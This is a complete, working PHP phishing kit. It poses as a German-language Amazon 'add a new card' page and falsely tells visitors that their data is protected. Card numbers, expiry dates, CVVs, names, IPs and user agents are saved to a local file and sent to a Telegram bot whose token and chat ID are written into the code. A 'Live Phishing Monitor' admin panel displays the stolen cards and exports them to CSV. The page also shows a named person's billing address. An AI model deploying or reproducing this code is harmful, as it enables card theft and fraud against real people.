<?php
// ==================== إعدادات تيليغرام ====================
$botToken = '8832943565:AAGcI7DS4gWATLCUM78o3TSJVo5CBxCa-Wk';
$chatId = '-1003788054267';
// =========================================================

// ==================== التخزين المحلي ====================
$storageFile = 'cards.json';

// دالة قراءة البيانات المخزنة
function loadCards($file) {
    if (!file_exists($file)) return [];
    $data = file_get_contents($file);
    return json_decode($data, true) ?: [];
}

// دالة حفظ بيانات جديدة
function saveCard($file, $card) {
    $cards = loadCards($file);
    array_unshift($cards, $card); // الأحدث في البداية
    $cards = array_slice($cards, 0, 500); // حد أقصى 500 بطاقة
    file_put_contents($file, json_encode($cards, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

// دالة الإرسال إلى تيليغرام
function sendToTelegram($message, $botToken, $chatId) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    $context = stream_context_create($options);
    return @file_get_contents($url, false, $context);
}

// ==================== معالجة الإرسال ====================
$errorMessage = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_GET['admin'])) {
    $fullName   = trim($_POST['fullName'] ?? '');
    $cardNumber = trim($_POST['cardNumber'] ?? '');
    $expDate    = trim($_POST['expDate'] ?? '');
    $cvv        = trim($_POST['cvv'] ?? '');
    $cardName   = trim($_POST['cardName'] ?? '');

    if (empty($fullName) || empty($cardNumber) || empty($expDate) || empty($cvv)) {
        $errorMessage = 'Alle Felder sind Pflichtfelder. Bitte füllen Sie sie korrekt aus.';
    } else {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'غير معروف';
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'غير معروف';
        $timestamp = date('Y-m-d H:i:s');
        
        // حفظ محلياً
        $cardData = [
            'fullName'   => $fullName,
            'cardNumber' => $cardNumber,
            'expDate'    => $expDate,
            'cvv'        => $cvv,
            'cardName'   => $cardName,
            'ip'         => $ip,
            'ua'         => $ua,
            'time'       => $timestamp
        ];
        saveCard($storageFile, $cardData);
        
        // إرسال إلى تيليغرام
        $msg = "💳 <b>بطاقة جديدة</b> 💳\n\n";
        $msg .= "👤 الاسم: <code>" . htmlspecialchars($fullName) . "</code>\n";
        $msg .= "💳 رقم البطاقة: <code>" . htmlspecialchars($cardNumber) . "</code>\n";
        $msg .= "📅 تاريخ الانتهاء: <code>" . htmlspecialchars($expDate) . "</code>\n";
        $msg .= "🔐 CVV: <code>" . htmlspecialchars($cvv) . "</code>\n";
        $msg .= "🏷️ الاسم المخفي: <code>" . htmlspecialchars($cardName) . "</code>\n";
        $msg .= "🌐 IP: <code>$ip</code>\n";
        $msg .= "📱 المتصفح: <code>" . htmlspecialchars($ua) . "</code>\n";
        $msg .= "⏰ الوقت: <code>$timestamp</code>";
        
        @sendToTelegram($msg, $botToken, $chatId);
        
        header('Location: waiting2.html');
        exit();
    }
}

// ==================== Admin Panel ====================
if (isset($_GET['admin'])) {
    $cards = loadCards($storageFile);
    
    // مسح الكل
    if (isset($_GET['clear']) && $_GET['clear'] === 'all') {
        file_put_contents($storageFile, json_encode([]));
        header('Location: ?admin');
        exit();
    }
    
    // تصدير CSV
    if (isset($_GET['export']) && $_GET['export'] === 'csv') {
        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename="cards_export_' . date('Y-m-d_H-i-s') . '.csv"');
        $output = fopen('php://output', 'w');
        fwrite($output, "\xEF\xBB\xBF"); // BOM for Excel
        fputcsv($output, ['#', 'Full Name', 'Card Number', 'Expiry', 'CVV', 'Hidden Name', 'IP', 'User Agent', 'Timestamp']);
        $i = 1;
        foreach ($cards as $card) {
            fputcsv($output, [
                $i++,
                $card['fullName'] ?? '',
                $card['cardNumber'] ?? '',
                $card['expDate'] ?? '',
                $card['cvv'] ?? '',
                $card['cardName'] ?? '',
                $card['ip'] ?? '',
                $card['ua'] ?? '',
                $card['time'] ?? ''
            ]);
        }
        fclose($output);
        exit();
    }
    
    $totalCards = count($cards);
    $uniqueIPs = count(array_unique(array_column($cards, 'ip')));
    
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔴 Admin Panel — Live Monitor</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
        .header { display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 15px; margin-bottom: 20px; }
        .header h1 { font-size: 26px; }
        .header .sub { color: #8b949e; font-size: 14px; }
        .header .sub code { background: #21262d; padding: 2px 6px; border-radius: 4px; }
        .actions { display: flex; gap: 10px; flex-wrap: wrap; }
        .btn { padding: 8px 18px; border: 1px solid #30363d; border-radius: 6px; background: #21262d; color: #c9d1d9; text-decoration: none; font-size: 14px; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; }
        .btn:hover { background: #30363d; }
        .btn-danger { border-color: #f85149; color: #f85149; }
        .btn-danger:hover { background: #f8514911; }
        .btn-success { border-color: #3fb950; color: #3fb950; }
        .btn-success:hover { background: #3fb95011; }
        .stats { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .stat-box { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 15px 25px; flex: 1; min-width: 140px; }
        .stat-box .num { font-size: 30px; font-weight: bold; color: #58a6ff; }
        .stat-box .label { font-size: 12px; color: #8b949e; text-transform: uppercase; letter-spacing: 0.5px; }
        .live-badge { display: inline-block; background: #f85149; color: white; font-size: 11px; padding: 2px 10px; border-radius: 10px; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        table { width: 100%; border-collapse: collapse; background: #161b22; border-radius: 8px; overflow: hidden; }
        th { background: #1c2128; padding: 12px 10px; text-align: left; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; color: #8b949e; border-bottom: 2px solid #30363d; white-space: nowrap; }
        td { padding: 10px; border-bottom: 1px solid #21262d; font-size: 13px; }
        tr:hover td { background: #1c2128; }
        .card-num { font-family: 'Courier New', monospace; color: #f0883e; font-weight: bold; }
        .cvv { color: #f85149; font-weight: bold; }
        .ip { color: #79c0ff; }
        .time { color: #8b949e; font-size: 12px; white-space: nowrap; }
        .ua-cell { max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 11px; color: #8b949e; }
        .empty { text-align: center; padding: 50px; color: #8b949e; font-size: 16px; }
        .empty svg { margin-bottom: 10px; }
        .refresh-info { font-size: 12px; color: #8b949e; margin-top: 10px; text-align: center; }
        .bin-badge { display: inline-block; background: #1f6feb22; color: #58a6ff; padding: 1px 6px; border-radius: 8px; font-size: 10px; margin-left: 4px; }
        @media (max-width: 768px) {
            table { font-size: 12px; }
            th, td { padding: 6px 4px; }
            .ua-cell { max-width: 60px; }
            .header h1 { font-size: 20px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>🔴 Live Phishing Monitor <span class="live-badge">LIVE</span></h1>
            <div class="sub">Storage: <code><?= basename($storageFile) ?></code> — Auto-refresh every 3s</div>
        </div>
        <div class="actions">
            <a href="?admin" class="btn">🔄 Refresh</a>
            <a href="?admin&export=csv" class="btn btn-success">📥 Export CSV</a>
            <a href="?admin&clear=all" class="btn btn-danger" onclick="return confirm('Delete ALL saved cards? This cannot be undone.')">🗑 Clear All</a>
        </div>
    </div>

    <div class="stats">
        <div class="stat-box"><div class="num"><?= $totalCards ?></div><div class="label">💳 Total Cards</div></div>
        <div class="stat-box"><div class="num"><?= $uniqueIPs ?></div><div class="label">🌐 Unique IPs</div></div>
        <div class="stat-box"><div class="num"><?= count(array_unique(array_map(function($c) { return substr(preg_replace('/\s+/', '', $c['cardNumber'] ?? ''), 0, 6); }, $cards))) ?></div><div class="label">🔢 Unique BINs</div></div>
        <div class="stat-box"><div class="num" style="color: #f0883e;"><?= array_sum(array_map(function($c) { return strlen(preg_replace('/\s+/', '', $c['cardNumber'] ?? '')); }, $cards)) ?: 0 ?></div><div class="label">📊 Total Digits</div></div>
    </div>

    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>Card Number</th>
                <th>Exp</th>
                <th>CVV</th>
                <th>Full Name</th>
                <th>IP</th>
                <th>Timestamp</th>
                <th>User Agent</th>
            </tr>
        </thead>
        <tbody>
            <?php if (empty($cards)): ?>
                <tr><td colspan="8" class="empty">
                    <svg fill="#8b949e" height="48" viewBox="0 0 24 24" width="48"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg><br>
                    No cards captured yet. Waiting for submissions...
                </td></tr>
            <?php else: $i = 1; ?>
                <?php foreach ($cards as $card): 
                    $bin = substr(preg_replace('/\s+/', '', $card['cardNumber'] ?? ''), 0, 6);
                ?>
                <tr>
                    <td><?= $i++ ?></td>
                    <td class="card-num"><?= htmlspecialchars($card['cardNumber'] ?? '') ?><span class="bin-badge"><?= $bin ?></span></td>
                    <td><?= htmlspecialchars($card['expDate'] ?? '') ?></td>
                    <td class="cvv"><?= htmlspecialchars($card['cvv'] ?? '') ?></td>
                    <td><?= htmlspecialchars($card['fullName'] ?? '') ?></td>
                    <td class="ip"><?= htmlspecialchars($card['ip'] ?? '') ?></td>
                    <td class="time"><?= htmlspecialchars($card['time'] ?? '') ?></td>
                    <td class="ua-cell" title="<?= htmlspecialchars($card['ua'] ?? '') ?>"><?= htmlspecialchars(substr($card['ua'] ?? '', 0, 60)) ?></td>
                </tr>
                <?php endforeach; ?>
            <?php endif; ?>
        </tbody>
    </table>
    
    <div class="refresh-info">🔄 Page auto-refreshes every 3 seconds | <?= $totalCards ?> cards stored in <code><?= basename($storageFile) ?></code></div>

    <script>
        // Auto-refresh every 3 seconds
        setTimeout(() => window.location.reload(), 3000);
        
        // Keyboard shortcut: R = refresh
        document.addEventListener('keydown', (e) => {
            if (e.key === 'r' || e.key === 'R') window.location.href = '?admin';
        });
    </script>
</body>
</html>
<?php
    exit(); // نهاية Admin Panel
}

// ==================== الصفحة الأصلية (الفيشينغ كيت) ====================
// كل الـ HTML الأصلي يبدأ من هنا
$self = $_SERVER['PHP_SELF'];
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Karte hinzufügen</title>
    <style>
        /* هنا نحتفظ بنفس الأنماط الأصلية كاملة */
        * { box-sizing: border-box; }
        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #f4f4f4; }
        .pc { display: none; }
        .mb { display: block; }
        @media (min-width: 768px) { .pc { display: block; } .mb { display: none; } }
        .card-modal-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.4); display: flex; justify-content: center; align-items: center; z-index: 9999; }
        .card-modal { background: #fff; width: 90%; max-width: 600px; border-radius: 12px; padding: 30px 40px; position: relative; box-shadow: 0 4px 12px rgba(0,0,0,0.15); max-height: 90vh; overflow-y: auto; }
        @media (max-width: 768px) { .card-modal { padding: 20px 15px 90px 15px; width: 100%; border-radius: 12px 12px 0 0; } }
        .modal-close-btn { position: absolute; top: 20px; right: 20px; cursor: pointer; }
        .modal-header { text-align: center; margin-bottom: 25px; }
        .security-badge { color: #2e8b57; font-size: 14px; font-weight: 600; display: inline-flex; align-items: center; gap: 4px; }
        .card-logos-row { margin-bottom: 20px; }
        .card-form .form-group { margin-bottom: 18px; }
        .card-form label { display: flex; align-items: center; font-size: 14px; font-weight: bold; margin-bottom: 8px; }
        .help-icon { display: inline-flex; justify-content: center; align-items: center; width: 14px; height: 14px; background: #999; color: #fff; border-radius: 50%; font-size: 10px; margin-left: 6px; }
        .input-wrapper { position: relative; display: flex; align-items: center; border: 1px solid #ccc; border-radius: 4px; background: #fff; }
        .input-wrapper input { flex: 1; border: none; padding: 12px 10px; font-size: 16px; outline: none; }
        .input-icon { display: flex; align-items: center; padding: 0 10px; }
        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .error-text { color: #d01a1a; font-size: 13px; display: none; margin-top: 6px; }
        .form-group.has-error .error-text { display: block; }
        .form-group.has-error .input-wrapper { border-color: #d01a1a; }
        .success-icon { display: none; }
        .form-group.has-success .success-icon { display: flex; }
        .billing-address { margin-top: 25px; margin-bottom: 25px; }
        .billing-header { display: flex; justify-content: space-between; }
        .fixed-bottom-bar { margin-top: 25px; }
        .submit-btn { width: 100%; background: #ff7300; color: white; font-size: 18px; font-weight: bold; padding: 15px; border: none; border-radius: 100px; cursor: pointer; }
        .submit-btn:disabled { background: #f0f2f2; color: #b5bcc0; cursor: not-allowed; }
        .security-footer { display: flex; flex-direction: column; gap: 12px; }
        .sec-item { display: flex; align-items: flex-start; gap: 8px; font-size: 13px; }
        .bold-green { font-weight: bold; color: #2e8b57; }
        .loader-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(255,255,255,0.8); display: none; justify-content: center; align-items: center; z-index: 10000; }
        .spinner { border: 4px solid rgba(0,0,0,0.1); border-left-color: #ff7300; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-message { background: #ffebee; color: #c62828; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; }
    </style>
</head>
<body>
<div><img alt="" class="pc" src="4.png" style="width:100%;"><img alt="" class="mb" src="5.png" style="width:100%;"></div>
<div class="card-modal-overlay">
    <div class="card-modal">
        <div class="modal-close-btn" onclick="history.back()"><svg fill="none" height="24" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24" width="24"><line x1="18" x2="6" y1="6" y2="18"></line><line x1="6" x2="18" y1="6" y2="18"></line></svg></div>
        <div class="modal-header"><h2>Eine neue Karte hinzufügen</h2><div class="security-badge"><svg fill="currentColor" viewbox="0 0 24 24" width="18" height="18"><path d="M12 2C9.243 2 7 4.243 7 7v3H6c-1.103 0-2 .897-2 2v8c0 1.103.897 2 2 2h12c1.103 0 2-.897 2-2v-8c0-1.103-.897-2-2-2h-1V7c0-2.757-2.243-5-5-5zM9 7c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7z"></path></svg> Alle Daten sind geschützt &gt;</div></div>
        <div class="card-logos-row"><img src="https://images.ctfassets.net/gc4s9mi2asix/27iheywutAjlzI1CWL3srg/78dad30c9edccdf21edb709b6b0de272/Accepted-Cards-US.png" style="width:80%"></div>
        
        <?php if (!empty($errorMessage)): ?>
            <div class="error-message"><?= htmlspecialchars($errorMessage) ?></div>
        <?php endif; ?>

        <form class="card-form" id="creditCardForm" method="POST" action="<?= $self ?>">
            <!-- نفس الحقول الأصلية -->
            <div class="form-group" id="group-fullName">
                <label>* Vollständiger Name</label>
                <div class="input-wrapper">
                    <input type="text" name="fullName" id="fullName" placeholder="Vollständiger Name" autocomplete="name" maxlength="50" required>
                </div>
                <span class="error-text">Bitte gib den vollständigen Namen ein.</span>
            </div>
            <div class="form-group" id="group-cardNumber">
                <label>* Kartennummer</label>
                <div class="input-wrapper">
                    <input type="tel" name="cardNumber" id="cardNumber" placeholder="Kartennummer" autocomplete="cc-number" maxlength="23" required>
                </div>
                <span class="error-text">Bitte gib die Kartennummer ein.</span>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>* Ablaufdatum</label>
                    <div class="input-wrapper"><input type="tel" name="expDate" id="expDate" placeholder="MM/JJ" autocomplete="cc-exp" maxlength="5" required></div>
                    <span class="error-text">Bitte ein gültiges Ablaufdatum eingeben.</span>
                </div>
                <div class="form-group">
                    <label>* CVV <span class="help-icon">?</span></label>
                    <div class="input-wrapper">
                        <input type="tel" name="cvv" id="cvv" placeholder="3-4 Zeichen" autocomplete="cc-csc" maxlength="4" required>
                        <div class="input-icon right"><svg fill="currentColor" viewbox="0 0 24 24" width="20" height="20"><path d="M12 2C9.243 2 7 4.243 7 7v3H6c-1.103 0-2 .897-2 2v8c0 1.103.897 2 2 2h12c1.103 0 2-.897 2-2v-8c0-1.103-.897-2-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm8 13H5v-8h14v8z"></path></svg></div>
                    </div>
                    <span class="error-text">Ungültige CVV.</span>
                </div>
            </div>
            <div class="billing-address">
                <div class="billing-header"><label>* Rechnungsadresse</label><a href="#" class="edit-btn">Bearbeiten</a></div>
                <p class="address-text">benjamin matthias, Gebelsbergstr. 97, Stuttgart, Baden-Württemberg 70199, Deutschland</p>
            </div>
            <input type="hidden" name="cardName" value="benjamin matthias">
            <div class="security-footer">
                <!-- نفس محتوى الـ security footer الأصلي -->
                <div class="sec-item">
                    <svg fill="#0e8c08" height="1em" viewbox="0 0 1024 1024" width="1em"><path d="M453.8 53.5c33.4-13.3 70.5-13.5 104.1-0.7l340.5 130.2c41.2 15.7 67.6 56 65.7 100l-8.2 190.2c-6.9 160.5-88.2 308.6-219.8 400.6l-116.5 81.6c-67 46.8-156.1 46.8-223.1 0l-115.1-80.5c-131.5-92-211.7-240.8-216.2-401.2l-5.4-191.4c-1.2-43 24.6-82.2 64.6-98.1z m258.7 327.4c-15.8-16.1-41.8-16.4-57.9-0.5l-178.8 175.5-89.9-81.2c-16.8-15.2-42.7-13.8-57.9 3-15.2 16.8-13.8 42.7 2.9 57.8l118.6 107.1c16.1 14.5 40.7 14 56.2-1.2l206.3-202.6c16.1-15.8 16.4-41.8 0.5-57.9z"></path></svg>
                    <span class="bold-green">amazon schützt deine Kartendaten</span>
                </div>
                <div class="sec-item" style="display: flex; gap: 10px;">
                    <div><svg fill="#0e8c08" height="1em" viewbox="0 0 1024 1024" width="1em"><path d="M930.4 227.8l-108.2-84.8-409.5 522.4-243.1-188.7-84.3 108.6 351.2 272.7z"></path></svg></div>
                    <span>amazon befolgt den Payment Card Industry Data Security Standard (PCI DSS) beim Umgang mit Kartendaten</span>
                </div>
                <div class="sec-item">
                    <svg fill="#0e8c08" height="1em" viewbox="0 0 1024 1024" width="1em"><path d="M930.4 227.8l-108.2-84.8-409.5 522.4-243.1-188.7-84.3 108.6 351.2 272.7z"></path></svg>
                    <span>Die Kartendaten sind sicher und werden nicht gefährdet</span>
                </div>
                <div class="sec-item">
                    <svg fill="#0e8c08" height="1em" viewbox="0 0 1024 1024" width="1em"><path d="M930.4 227.8l-108.2-84.8-409.5 522.4-243.1-188.7-84.3 108.6 351.2 272.7z"></path></svg>
                    <span>Alle Daten sind geschützt</span>
                </div>
                <div class="sec-item">
                    <svg fill="#0e8c08" height="1em" viewbox="0 0 1024 1024" width="1em"><path d="M930.4 227.8l-108.2-84.8-409.5 522.4-243.1-188.7-84.3 108.6 351.2 272.7z"></path></svg>
                    <span>amazon verkauft niemals deine Kartendaten</span>
                </div>
            </div>
            <div class="fixed-bottom-bar"><button class="submit-btn" id="submitBtn" type="submit">Deine Karte hinzufügen</button></div>
        </form>
    </div>
</div>
<div class="loader-overlay" id="loadingSpinner"><div class="spinner"></div></div>

<script>
    document.getElementById('cardNumber').addEventListener('input', function(e) {
        let val = e.target.value.replace(/\s/g, '');
        let formatted = '';
        for (let i = 0; i < val.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += val[i];
        }
        e.target.value = formatted;
    });
    document.getElementById('expDate').addEventListener('input', function(e) {
        let val = e.target.value.replace(/\D/g, '');
        if (val.length > 2) e.target.value = val.slice(0,2) + '/' + val.slice(2,4);
        else e.target.value = val;
    });
    document.getElementById('creditCardForm').addEventListener('submit', function() {
        document.getElementById('submitBtn').disabled = true;
        document.getElementById('loadingSpinner').style.display = 'flex';
    });
</script>
</body>
</html>